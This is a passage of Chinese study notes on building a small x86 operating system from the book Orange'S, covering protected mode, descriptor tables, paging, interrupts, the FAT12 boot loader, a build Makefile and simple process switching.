是主要原因）。</li></ol></li><li><ol start="2"><li>引导程序：操作系统的引导程序（Bootloader）通常运行在实模式下，当引导程序加载完毕后，会切换到保护模式，以便操作系统可以更好地管理系统资源和内存。</li></ol></li><li><ol start="3"><li>性能：一些特殊场景需要CPU在实模式下运行，以获取更好的性能。例如，在一些嵌入式系统或低级别的驱动程序中，可能需要直接访问硬件设备或内存地址，这时可以选择在实模式下运行。</li></ol></li><li><ol start="4"><li>调试：在进行系统调试和开发过程中，将CPU从实模式切换到保护模式可以提供更丰富的调试信息和工具支持，帮助开发人员更好地进行调试和优化。</li></ol></li></ul></li></ul></li></ul><h4 id="gdt(global-descriptor-table)" tabindex="-1">GDT(Global Descriptor Table)</h4><ul><li><p>在IA32下，CPU有两种工作模式：实模式和保护模式。</p></li><li><p>保护模式下，CPU有着强大的寻址能力吗，并为强大的32为操作系统提供了更好的硬件基础。</p></li><li><p>GDT的作用是用来提供段式存储机制，这种机制是通过寄存器和GDT中的描述符共同提供的。</p></li><li><p>在实模式下，由于早期CPU为16位，其有着16位的寄存器，16位的数据总线，但有20位的地址总线，因此物理地址遵循的计算公式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>物理地址</mtext><mo>=</mo><mtext>段值</mtext><mo>∗</mo><mn>16</mn><mo>+</mo><mtext>偏移</mtext></mrow><annotation encoding="application/x-tex">物理地址 = 段值*16+偏移</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">物理地址</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">段值</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">偏移</span></span></span></span></eq>，相当于将段值左移4位再加上偏移，且段值和便宜都是16位的。</p></li><li><p>在CPU进入32位时代后，寄存器和地址线均为32位，但段值这一手段并没有被抛弃，此时引入实模式向保护模式的转变，保护模式下依然采用&quot;段：偏移&quot;这样的形式来表示，但保护模式下“段”的概念发生根本性的变化。</p><ul><li>实模式下，段值可以看作地址的一部分，从物理地址的计算公式可以看出</li><li>保护模式下，段值仅变为一个索引，这个索引指向一个数据结构的一个表项，表项中详细定义了段的起始地址，界限，属性等内容。这个数据结构，就是GDT（也可以是LDT）。GDT的表项也叫描述符(Descripter)。GDT即为全局描述符表。</li><li>因此GDT的作用是提供段式存储机制，这种机制是通过段寄存器和GDT中的描述符共同提供的</li></ul></li><li><p>下图为代码段和数据段描述符示例,此外还有系统段描述符和门描述符<br><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/GDT0.jpg" alt="GDT0.jpg"></p></li><li><p>选择子结构，当TI个PRL都为0时，选择子就变成了对应描述符相当于GDT基址的偏移。<br><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/%E9%80%89%E6%8B%A9%E5%AD%90.jpg" alt="选择子"></p></li><li><p>在保护模式下，寻址方式如下<img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%AF%BB%E5%9D%80.jpg" alt="保护模式下的寻址"></p></li></ul><h4 id="%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%BB%E8%A6%81%E6%AD%A5%E9%AA%A4" tabindex="-1">进入保护模式的主要步骤</h4><ol><li>准备GDT</li><li>用lgdt加载gdtr</li><li>打开A20</li><li>置cr0的PE位</li><li>跳转，进入保护模式</li></ol><h4 id="%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%B1%9E%E6%80%A7" tabindex="-1">描述符属性</h4><ul><li>一致代码段，一致：<ul><li>当转移目标是一个特权级更高的一直代码段，当前特权级会被延续下去</li><li>而目标是一个特权级更高的非一致代码段，会引起常规保护错误，除非是用调用门或者任务门</li><li>目标代码的特权级低，都不能通过call或者jmp转移进去</li></ul></li></ul><p>||特权级低-&gt;高|特权级高-&gt;低|相同特权级之间|适用于何种代码<br>|-|-|-|-|<br>|一致代码段|Y|N|Y|不访问受保护的资源和某些类型的异常处理的系统代码<br>|非一致代码段|N|N|Y|避免特权级的程序访问而被保护起来的系统代码<br>|数据段（总是非一致）|N|Y|Y|</p><h3 id="3.2-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E8%BF%9B%E9%98%B6" tabindex="-1">3.2 保护模式进阶</h3><h4 id="ldt-(local-descriptor-table)" tabindex="-1">LDT (Local Descriptor Table)</h4><ul><li>LDT（Local Descriptor Table）局部描述符表，与GDT差不多，但选择子的TI位必须置为1。在运用它时，需要先使用lldt指令加载ldtr，lldt的操作数是GDT中用来描述LDT的描述符1</li><li>保护模式中“保护”二字的含义<ul><li>在描述符中段基址和段界限定义了一个段的范围，对超越段界限之外的地址访问是被禁止的，这是对段的一种保护</li><li>同时复杂的段属性对一个端的各个方面的定义规定限制了段的行为和性质，这算是一种功能保护</li></ul></li></ul><h4 id="%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B0" tabindex="-1">特权级概述</h4><ul><li><p>特权级</p><ul><li>在IA32的分段机制中，特权级共有4个级别，从高到低位0，1，2，3</li><li>处理器通过识别CPL，DPL，RPL这三种特权级进行特权级检验<ul><li>CPL：当前执行的程序或任务的特权级</li><li>DPL：表示段或者门的特权级</li><li>RPL：请求优先级</li></ul></li><li>特权级转移：通过jmp或call进行直接转移</li></ul></li><li><p>门：也是一种描述符，可以分为四种</p><ul><li>调用门：本质上为入口地址，但可以用来实现不同特权级代码之间的转移<ul><li>使用调用门的过程分为两个部分：</li><li><ol><li>一部分是从低特权级到高特权级，通过调用门和call指令实现</li></ol></li><li><ol start="2"><li>另一部分是从高特权级到低特权级，通过ret指令来实现</li></ol></li></ul></li><li>终端门</li><li>陷阱门</li><li>任务门</li></ul></li><li><p>TSS(Task-State Stack)</p><ul><li>TSS是一个数据结构，用于存储任务的状态信息，TSS通常与任务切换和任务管理相关联，它存储了任务的上下文、特权级别和其他与任务执行相关的信息。<ol><li>任务切换：TSS用于在任务间进行切换。当处理器从一个任务切换到另一个任务时，它会保存当前任务的上下文信息到当前任务的TSS中，然后加载新任务的上下文信息从新任务的TSS中。这个过程通常由操作系统的调度器管理。</li><li>上下文信息：TSS中存储了任务的上下文信息，包括通用寄存器、段寄存器、控制寄存器、指令指针等。在任务切换时，处理器会保存当前任务的上下文到TSS中，并在切换到新任务时加载新任务的上下文。</li><li>特权级别：TSS中也包含了任务的特权级别信息，即任务执行时所处的特权级别。这是由特权级别字段（CPL，Current Privilege Level）指示的，它决定了任务对系统资源的访问权限。</li><li>任务管理：TSS也可以用于任务管理，其中每个任务都有一个唯一的TSS。任务管理器可以使用TSS来管理任务的状态、上下文和特权级别。</li></ol></li></ul></li></ul><h3 id="3.3-%E9%A1%B5%E5%BC%8F%E5%AD%98%E5%82%A8" tabindex="-1">3.3 页式存储</h3><ul><li><ol><li>什么叫做页？<br>所谓页，就是一块内存。</li></ol></li><li><ol start="2"><li>逻辑地址，线性地址，物理地址<br>在未打开分页机制前，线性地址等同于物理地址，可以理解为逻辑地址通过分段机制直接转换为物理地址。<br>当分页开启后，分段机制将逻辑地址转换为线性地址，线性地址再通过分页机制转换成物理地址。</li></ol></li><li><ol start="3"><li>为什么分页？<br>其主要目的是实现虚拟存储器，线性地址的任何一个页都可以映射到物理地址中的任何一个页，这使得内存管理变得相当灵活。</li></ol></li><li><p>PDE页目录表，PTE页表</p></li></ul><h3 id="3.4-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8" tabindex="-1">3.4 中断和异常</h3><ul><li><p>IDT：中断描述符表，描述符可以是以下三种</p><ul><li>中断门描述符</li><li>陷阱门描述符</li><li>任务门描述符</li></ul></li><li><p>IDT作用是将每一个中断向量和一个描述符对应起来，IDT也是一种向量表</p></li><li><p>异常的三种类型</p><ul><li>Fault错误：可被更正的异常，且被更正后，程序可以不失连续性地执行</li><li>Trap陷阱：发生trap地指令执行后立即被报告的异常</li><li>Abort异常：不总是报告异常发生位置的异常，不允许程序或任务继续执行，用来报告严重错误</li></ul></li><li><p>中断产生的原因有两种</p><ul><li>一种是外部中断，即由硬件产生的中断</li><li>另一种是由指令 int n 产生的中断，n即为向量号</li></ul></li></ul><h3 id="3.5-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84i%2Fo" tabindex="-1">3.5 保护模式下的I/O</h3><p>IOPL和IO许可位图</p><h3 id="3.6-%E5%B0%8F%E7%BB%93" tabindex="-1">3.6 小结</h3><p>保护模式有以下几方面含义：</p><ul><li>在GDT，LDT以及IDT中，每个描述符都有自己的界限和属性等内容，是对描述符所描述对象的一种限定和保护</li><li>分页机制中的PDE和PTE都含有R/W以及U/S位，提供了页级保护</li><li>也是存储的使用使应用程序使用的是线性地址空间而不是物理地址，于是物理内存就被保护起来</li><li>终端不再像实模式下一样使用，也提供特权检验等内容</li><li>I/O指令不再随便使用，于是被端口保护起来</li><li>在程序运行过程中，如果遇到不同特权级间的访问等情况，会对CPL，RPL，DPL，IOPL等内容进行严格的检验，同时可能伴随堆栈的切换，这都对不同层级的程序进行了保护</li></ul><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%AE%A9%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">第四章 让操作系统进入保护模式</h2><h3 id="4.1-%E7%AA%81%E7%A0%B4512%E5%AD%97%E8%8A%82%E9%99%90%E5%88%B6" tabindex="-1">4.1 突破512字节限制</h3><h4 id="fat12" tabindex="-1">FAT12</h4><p>FAT12文件系统的基本组成包括引导扇区（Boot Sector）、文件分配表（File Allocation Table）、根目录区（Root Directory Region）和数据区（Data Region）。</p><ul><li>引导扇区（Boot Sector）是文件系统的第一个扇区，包含了引导代码和文件系统的元数据，例如文件系统的标识、扇区大小等。引导扇区还包含一个特殊的标志，被用来指示磁盘是否可引导。</li><li>文件分配表（File Allocation Table）是一个记录文件分配信息的表格，它跟踪文件在磁盘上的存储位置。FAT12使用12位来表示每个文件的分配状态，例如是否被占用或空闲，以及文件块的链接关系。</li><li>根目录区（Root Directory Region）存储了存储设备的根目录的相关信息，包括文件名、扩展名、属性和起始簇号等。FAT12文件系统中的根目录区是固定大小的。</li><li>数据区（Data Region）是存储实际文件数据的地方。文件系统使用文件分配表中的链接关系来跟踪文件数据在数据区的存储位置。</li></ul><h4 id="loader%E6%A8%A1%E5%9D%97" tabindex="-1">loader模块</h4><p>一个操作系统从开机到运行，大致经历</p><pre><code class="language-mermaid">graph LRA[引导]--&gt;B[加载内核到内存];B--&gt;C[跳入保护模式];C--&gt;D[开始执行内核]</code></pre><p>因此在执行内核前，还需要几步，仅靠一个512B的引导扇区是无法加载内核到内存的，因此我们将这一步工作交给一个称为Loader的模块去实现，该模块没有内存限制。</p><p>一个简单的loader模块为</p><pre><code class="language-asm">org 0100h mov ax, 0B800h mov gs, ax mov ah, 0Fh    ; 0000: 黑底    1111: 白字 mov al, 'L' mov [gs:((80 * 0 + 39) * 2)], ax ; 屏幕第 0 行, 第 39 列。 jmp $    ; 到此停住</code></pre><p>随后通过<code>nasm loader.asm -o loader.bin</code>转为二进制文件，准备放入磁盘。</p><h4 id="%E5%8A%A0%E8%BD%BDloader%E5%85%A5%E5%86%85%E5%AD%98" tabindex="-1">加载Loader入内存</h4><p>这里boot首先要做出改变，首先引导扇区需要BPB头信息才能被识别，其次我们要在boot的代码里实现寻找loader模块，这里代码见书附磁盘。</p><p>随后我们就要将loader模块放入磁盘，让boot程序找到它并执行。</p><p>命令为</p><pre><code class="language-asm">nasm boot.asm -o boot.binnasm loader.asm -o loader.bindd if=boot.bin of=a.img bs=512 count=1 conv=notruncsudo mount -o loop a.img /mnt/floppy/sudo cp loader.bin /mnt/floppy/ -vsudo umount /mnt/floppy/</code></pre><p>该指令将软盘挂载到/mnt/floppy下，在将loader程序复制进去，以达到将loader放入软盘的目的，但是我的<code>mnt</code>目录下没有floppy文件夹，因此首先用指令<code>mkdir /mnt/floppy/</code>创建一个挂载软盘的区域</p><h3 id="4.2-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" tabindex="-1">4.2 保护模式下的操作系统</h3><ul><li>Loader要做的<ul><li>加载内核到内存</li><li>跳入保护模式</li></ul></li></ul><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%86%85%E6%A0%B8%E9%9B%8F%E5%BD%A2" tabindex="-1">第五章 内核雏形</h2><h3 id="1-linux%E4%B8%8Basm%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E8%A1%8C" tabindex="-1">1 linux下asm文件的运行</h3><p>运行hello.asm文件</p><pre><code class="language-asm">; 编译链接方法; (ld 的‘-s’选项意为“strip all”);; $ nasm -f elf hello.asm -o hello.o; $ ld -s hello.o -o hello; $ ./hello; Hello, world!; $[section .data] ; 数据在此strHello db &quot;Hello, world!&quot;, 0AhSTRLEN  equ $ - strHello[section .text] ; 代码在此global _start ; 我们必须导出 _start 这个入口，以便让链接器识别_start: mov edx, STRLEN mov ecx, strHello mov ebx, 1 mov eax, 4  ; sys_write int 0x80  ; 系统调用 mov ebx, 0 mov eax, 1  ; sys_exit int 0x80  ; 系统调用</code></pre><p>之后首先转换为.o二进制文件<br><code>nasm -f elf hello.asm -o hello.o</code><br>再进行链接得到可执行文件<br><code>ld -s hello.o -o hello</code>，然而这句话会报错，因为书中系统为32位，而目前（2023）年基本为64位机，所以我们应用指令<code>ld -m elf_i386 -s hello.o -o hello</code>生成可执行文件<br>再运行<code>./hello</code>可看到输出Hello，World!</p><h3 id="2-linux%E4%B8%8B%E6%B1%87%E7%BC%96%E5%92%8Cc%E5%90%8C%E6%AD%A5%E4%BD%BF%E7%94%A8" tabindex="-1">2 linux下汇编和C同步使用</h3><p>书中例子</p><pre><code class="language-asm">; 编译链接方法; (ld 的‘-s’选项意为“strip all”);; $ nasm -f elf foo.asm -o foo.o; $ gcc -c bar.c -o bar.o; $ ld -s hello.o bar.o -o foobar; $ ./foobar; the 2nd one; $extern choose ; int choose(int a, int b);[section .data] ; 数据在此num1st  dd 3num2nd  dd 4[section .text] ; 代码在此global _start ; 我们必须导出 _start 这个入口，以便让链接器识别。global myprint ; 导出这个函数为了让 bar.c 使用_start: push dword [num2nd] ; `. push dword [num1st] ;  | call choose  ;  | choose(num1st, num2nd); add esp, 8  ; / mov ebx, 0 mov eax, 1  ; sys_exit int 0x80  ; 系统调用; void myprint(char* msg, int len)myprint: mov edx, [esp + 8] ; len mov ecx, [esp + 4] ; msg mov ebx, 1 mov eax, 4  ; sys_write int 0x80  ; 系统调用 ret</code></pre><pre><code class="language-C">void myprint(char* msg, int len);int choose(int a, int b)&#123; if(a &gt;= b)&#123;  myprint(&quot;the 1st one\n&quot;, 13); &#125; else&#123;  myprint(&quot;the 2nd one\n&quot;, 13); &#125; return 0;&#125;</code></pre><p>使用指令来运行代码<br><code>nasm -f elf -o foo.o foo.asm</code><br><code>gcc - m32 -c -o bar.o bar.c</code>(这里和书上的不一样，这里生成32位可执行文件)<br><code>ld -m -elf_i386 -s -o foobar foo.o bar.o</code>32位链接<br><code>./foobar</code></p><p>运行结果可以根据代码得出</p><h3 id="3-elf(executable-and-linkable-format)" tabindex="-1">3 ELF(Executable and  Linkable Format)</h3><p>ELF（Executable and Linkable Format）是一种常见的可执行文件和可链接文件的标准文件格式。它被广泛用于类Unix系统（如Linux）和其他操作系统上<br>操作系统内核位ELF文件格式,该文件格式由四部分组成（ELF头，程序头表，节，节头表），只有ELF头位置固定，其余部分由ELF头位置决定</p><ul><li>文件头ELF头（File Header）：文件头位于ELF文件的开头，包含了描述整个文件的基本信息，如目标体系结构、入口点地址、段表和节表的位置和大小等。</li><li>程序头表（Program Header Table）：程序头表描述了在可执行文件加载时需要进行的段的布局和操作。每个条目描述了一个段在内存中的位置、大小、访问权限以及其他相关信息。程序头表对于可执行文件和共享库非常重要。</li></ul><h3 id="4-%E4%BB%8Eloader%E5%88%B0%E5%86%85%E6%A0%B8" tabindex="-1">4 从Loader到内核</h3><p>loader要做的两项工作：</p><ol><li>加载内核到内存</li><li>跳入保护模式</li></ol><ul><li>用loader加载ELF文件</li></ul><p>使用附书磁盘中的文件 <code>fat12hdr.inc,boot.asm,loader.asm</code>首先编译连接生成磁盘驱动(boot.asm和loader.asm中已经include过fat12hdr.ihc)，此时磁盘中仍没有内核。</p><p>此时运行驱动磁盘会显示<code>No KERNEL</code></p><p>之后使用附书磁盘的kernel.asm文件，使用命令</p><pre><code class="language-asm">nasm -f elf -o kernel.o kernel.asmld -m elf_i386 -s -o kernel.bin kernel.osudo mount -o loop a.img /mnt/floppy/sudo cp kernel.bin /mnt/floppy/ -vsudo umount /mnt/floppy/</code></pre><p>之后再运行驱动磁盘只会显示<code>Ready.字样</code>，此时已将内核加载至内存</p><ul><li>跳入保护模式</li><li>重新放置内核</li><li>向内核交出控制权</li></ul><p>以上操作按书上做即可</p><h3 id="5-%E6%89%A9%E5%85%85%E5%86%85%E6%A0%B8" tabindex="-1">5 扩充内核</h3><ul><li>切换堆栈和GDT</li><li>整理文件夹与makefile<ul><li>此后可以更快地产生驱动磁盘，made in heaven</li><li>只需<code>make image</code>即可</li></ul></li></ul><pre><code class="language-makefile">########################## Makefile for Orange'S ########################### Entry point of Orange'S# It must have the same value with 'KernelEntryPointPhyAddr' in load.inc!ENTRYPOINT= 0x30400# Offset of entry point in kernel file# It depends on ENTRYPOINTENTRYOFFSET=   0x400# Programs, flags, etc.ASM= nasmDASM= ndisasmCC= gcc -m32 -fno-stack-protectorLD= ld ASMBFLAGS= -I boot/include/ASMKFLAGS= -I include/ -f elfCFLAGS= -I include/ -c -fno-builtinLDFLAGS= -m elf_i386 -s -Ttext $(ENTRYPOINT)DASMFLAGS= -u -o $(ENTRYPOINT) -e $(ENTRYOFFSET)# This ProgramORANGESBOOT= boot/boot.bin boot/loader.binORANGESKERNEL= kernel.binOBJS= kernel/kernel.o kernel/start.o kernel/i8259.o kernel/global.o kernel/protect.o lib/klib.o lib/kliba.o lib/string.oDASMOUTPUT= kernel.bin.asm# All Phony Targets.PHONY : everything final image clean realclean disasm all buildimg# Default starting positioneverything : $(ORANGESBOOT) $(ORANGESKERNEL)all : realclean everythingfinal : all cleanimage : final buildimgclean :rm -f $(OBJS)realclean :rm -f $(OBJS) $(ORANGESBOOT) $(ORANGESKERNEL)disasm :$(DASM) $(DASMFLAGS) $(ORANGESKERNEL) &gt; $(DASMOUTPUT)# We assume that &quot;a.img&quot; exists in current folderbuildimg :dd if=boot/boot.bin of=a.img bs=512 count=1 conv=notruncsudo mount -o loop a.img /mnt/floppy/sudo cp -fv boot/loader.bin /mnt/floppy/sudo cp -fv kernel.bin /mnt/floppysudo umount /mnt/floppyboot/boot.bin : boot/boot.asm boot/include/load.inc boot/include/fat12hdr.inc$(ASM) $(ASMBFLAGS) -o $@ $&lt;boot/loader.bin : boot/loader.asm boot/include/load.inc \boot/include/fat12hdr.inc boot/include/pm.inc$(ASM) $(ASMBFLAGS) -o $@ $&lt;$(ORANGESKERNEL) : $(OBJS)$(LD) $(LDFLAGS) -o $(ORANGESKERNEL) $(OBJS)kernel/kernel.o : kernel/kernel.asm$(ASM) $(ASMKFLAGS) -o $@ $&lt;kernel/start.o: kernel/start.c include/type.h include/const.h include/protect.h \include/proto.h include/string.h$(CC) $(CFLAGS) -o $@ $&lt;kernel/i8259.o : kernel/i8259.c include/type.h include/const.h include/protect.h \include/proto.h$(CC) $(CFLAGS) -o $@ $&lt;kernel/global.o : kernel/global.c$(CC) $(CFLAGS) -o $@ $&lt;kernel/protect.o : kernel/protect.c$(CC) $(CFLAGS) -o $@ $&lt;lib/klib.o : lib/klib.c$(CC) $(CFLAGS) -o $@ $&lt;lib/kliba.o : lib/kliba.asm$(ASM) $(ASMKFLAGS) -o $@ $&lt;lib/string.o : lib/string.asm$(ASM) $(ASMKFLAGS) -o $@ $&lt;</code></pre><ul><li>添加中断处理<ul><li>这里出现了有关<code>__stack_chk_fail_local</code>的报错，上网查阅后找到解决方法</li><li>在gcc编译时加上参数<code>-fno-stack-protector</code>即可，在makefile中更改位置为<code>CC= gcc -m32 -fno-stack-protector</code></li><li>这里不知道为什么会输出乱码，急急急（未解决），但好像使用光盘上的磁盘就没问题，应该是在编译环节出现问题。</li><li>经过比对，发现光盘上的boot.asm文件在虚拟机转化为bin文件后在虚拟磁盘上的二进制数，与光盘上的虚拟磁盘上的二进制数不同，即boot文件已有区别，可能是32位机子和64位机子的问题。。。于此开始使用32位的ubuntu16.04</li></ul></li></ul><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%BF%9B%E7%A8%8B" tabindex="-1">第六章 进程</h2><h3 id="6.1-6.2-%E8%BF%9F%E5%88%B0%E7%9A%84%E8%BF%9B%E7%A8%8B%E4%B8%8E%E6%A6%82%E8%BF%B0" tabindex="-1">6.1-6.2 迟到的进程与概述</h3><p>进程是一个正在运行的程序的实例。它是操作系统进行资源分配和管理的基本单位。每个进程都有独立的地址空间、代码、数据和打开的文件等资源。它拥有自己的执行环境，并可以通过操作系统调度来与其他进程并发执行。进程之间是相互独立的，每个进程都在自己的地址空间中运行，并通过进程间通信（IPC）机制进行必要的数据交换。</p><p>线程是在进程内部执行的较小单位。一个进程可以包含多个线程，它们共享相同的地址空间和资源。线程在进程内并发执行，共享进程的上下文、数据和文件等资源。多线程可以实现并行处理，提高程序的性能和响应能力。线程之间的切换比进程之间的切换更轻量级，开销更小。</p><ul><li>以下是进程和线程的一些关键区别：<ul><li>资源拥有：进程是独立的执行实体，拥有自己的地址空间和资源，包括打开的文件、网络连接等。线程是进程内的执行单元，共享进程的资源。</li><li>调度和切换：进程是操作系统进行调度和切换的基本单位。线程是在进程内调度和切换的基本单位，切换开销比进程切换小。</li><li>通信和同步：不同进程之间的通信需要使用进程间通信（IPC）机制，如管道、消息队列、共享内存等。线程之间可以通过共享内存和同步原语（如锁、条件变量）进行直接通信和同步。</li><li>容错性：由于每个进程拥有独立的地址空间，一个进程的崩溃不会影响其他进程。但是，线程共享进程的地址空间，一个线程的错误可能会导致整个进程崩溃。</li></ul></li></ul><h3 id="6.3-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B" tabindex="-1">6.3 最简单的进程</h3><ul><li>进程切换时的过程<ul><li><ol><li>进程A运行中</li></ol></li><li><ol start="2"><li>时钟中断发生，ring1 -&gt; ring0,时钟中断处理程序启动</li></ol></li><li><ol start="3"><li>进程调度，下一个应运行的进程(假设为B进程)被指定</li></ol></li><li><ol start="4"><li>进程B被恢复，ring0 -&gt; ring1</li></ol></li><li><ol start="5"><li>进程B运行中</li></ol></li></ul></li><li>想要实现这些功能，需要实现以下3项<ul><li>时钟中断处理程序</li><li>进程调度模块</li><li>两个进程</li></ul></li></ul><h4 id="1-%E7%AE%80%E5%8D%95%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF" tabindex="-1">1 简单进程的关键技术</h4><ul><li>进程的哪些状态需要保存<ul><li>只有被改变的才有保存的必要，因此寄存器的值需要保存起来</li></ul></li><li>进程的状态何需要以及怎样被保存<ul><li>进程被挂起时即刻保存，中断发生则立即执行</li></ul></li><li>恢复进程B的状态</li><li>进程表的引入<ul><li>进程表：保存进程状态的数据结构，也称进程控制块PCB</li><li>进程表相当于进程的提纲</li></ul></li><li>进程栈和内核栈<ul><li>在进程调度模块中会使用到堆栈，而寄存器被压到进程表之后，esp是指向进程的某个位置的</li><li>为此，在进程调度后将esp指向内核栈，避免错误的发生</li></ul></li><li>特权级变换:ring1-&gt;ring0<ul><li>由外层向内层转移时，需要从TSS中取出内层ss和esp作为目标代码的ss和esp。因此必须事先准备好TSS。由于每个进程相对独立，将涉及到的描述符放在LDT中，为此，需要给每个进程准备LDT</li></ul></li><li>特权级变换:ring0-&gt;ring1<ul><li>跳转到中断处理程序的后半部分，“假装”发生了一次中断来启动进程A，利用iretd来实现ring0到ring1转移</li></ul></li></ul><h4 id="2-%E7%AC%AC%E4%B8%80%E6%AD%A5-%E2%80%93-ring0--%3E-ring1" tabindex="-1">2 第一步 – ring0 -&gt; ring1</h4><ul><li>操作系统启动第一个进程时的入口</li></ul><pre><code>restart:movesp, [p_proc_ready]lldt[esp + P_LDT_SEL]leaeax, [esp + P_STACKTOP]movdword [tss + TSS3_S_SP0], eaxrestart_reenter:decdword [k_reenter]popgspopfspopespopdspopadaddesp, 4iretd</code></pre><p>上述代码中：</p><ol><li>p_proc_ready是一个结构类型指针，指向该进程在进程表中的位置；当要恢复一个进程时，便将esp指向这个结构体的开始处，然后运行一系列pop命令将寄存器弹出；</li><li>esp+P_LDT_SEL时选择子的位置，这个语句即对ldt_sel的初始化</li><li><ol start="4"><li>将进程表结构体的第一个结构体成员regs的末地址赋给TSS中ring0堆栈指针域esp</li></ol></li></ol><p>接下来一次做一些优先级变化需要的准备工作</p><ol><li>时间中断处理程序：这里先不需要完善的，只要能实现优先级跳转即可</li><li>化整为零：进程表，进程体，GDT，TSS，这四个关系可分为三个部分<ol><li>进程表和GDT：进程表内的LDT Selector对应GDT的一个描述符，而这个描述符所指向的内存空间位于进程表</li><li>进程表和进程：进程表是进程的描述，进程在运行过程中如果被打断，各个寄存器的值都会保存在进程表中。此外，程序一定会使用堆栈，因此需要事先指定esp</li><li>GDT和TSS：GDT中有一个描述符对应TSS，需要事先初始化这个描述符</li></ol></li><li>使用restart函数，进行优先级转换</li></ol><p><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_3_2_4.jpg" alt></p><ul><li>回顾<ul><li>第一个进程启动过程：<ul><li><ol><li>进程体TestA()准备就绪</li></ol></li><li><ol start="2"><li>初始化GDT中的TSS和LDT两个描述符，以及初始化TSS(在init_prot()完成)</li></ol></li><li><ol start="3"><li>准备进程表(在kernel_main()中完成)</li></ol></li><li><ol start="4"><li>完成跳转，实现ring0-&gt;ring1（kernel.asm之restart）</li></ol></li></ul></li></ul></li></ul><h4 id="3-%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E2%80%93-%E4%B8%B0%E5%AF%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F" tabindex="-1">3 第二步 – 丰富中断处理程序</h4><ol><li>让时间中断开始起作用</li><li>现场的保护和恢复<br>中断例程中使用栈来保护寄存器值</li><li>赋值tss.esp0<br>存储在ring0时栈指针的位置</li><li>内核栈</li></ol><ul><li>内核栈（Kernel Stack）是操作系统内核为每个运行的进程或线程所分配的一块专用内存空间。它用于保存与进程或线程执行相关的上下文信息，包括函数调用栈、局部变量、寄存器状态等。</li><li>每个进程或线程都有自己的内核栈，它在内核模式下使用。当进程或线程发生内核态的切换或触发中断时，当前的执行上下文将被保存到该进程或线程的内核栈中，以便在恢复执行时能够正确地还原上下文。</li><li>内核栈通常位于内核地址空间中，并且具有固定的大小。为了确保安全和隔离，每个进程或线程的内核栈是独立的，不同进程或线程之间不会相互干扰。</li></ul><ol start="5"><li>中断重入</li></ol><ul><li>中断重入是指在一个中断服务程序（ISR）正在执行时，又发生了同样或更高优先级的中断请求，导致中断服务程序被中断。当发生这种情况时，系统会挂起当前的中断服务程序，执行新到来的中断请求，并在处理完该中断后返回到原来的中断服务程序继续执行。</li><li>中断处理程序是被动的，它知道中断发生时忠实的执行那段代码，不理会中断何时发生，因此我们需要设置一个全局变量限制中断处理程序的运行。<ul><li>设置一个全局变量即可，全集变量初值-1，当中断处理程序开始执行时它自加，结束时自加。在处理程序开头处这个变量值需要被检查一下，如果值不是0，说明发生了中断嵌套，直接跳到最后，结束中断程序的执行<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_3_3.jpg" alt></li></ul></li></ul><h3 id="6.4-%E5%A4%9A%E8%BF%9B%E7%A8%8B" tabindex="-1">6.4 多进程</h3><ul><li><ol><li>添加一个进程B</li></ol></li></ul><pre><code class="language-c">void TestB()&#123;  int i=0x1000;  while(1)&#123;    disp_str(&quot;B&quot;);    disp_int(i++);    disp_str(&quot;.&quot;);    delay(1);  &#125;&#125;</code></pre><ul><li><ol start="2"><li>相关的变量和宏</li></ol><ul><li>进程表，进程体，GDT，TSS</li></ul></li><li><ol start="3"><li>进程表初始化代码扩充</li></ol><ul><li>使用Minix中定义的数组tasktab，该数组的每一项定义了一个进程的开始地址，堆栈等，至此可以用for循环来初始化进程表</li></ul></li><li><ol start="4"><li>初始化LDT，3，4均在上一步加上循环对多进程赋值即可</li></ol></li><li><ol 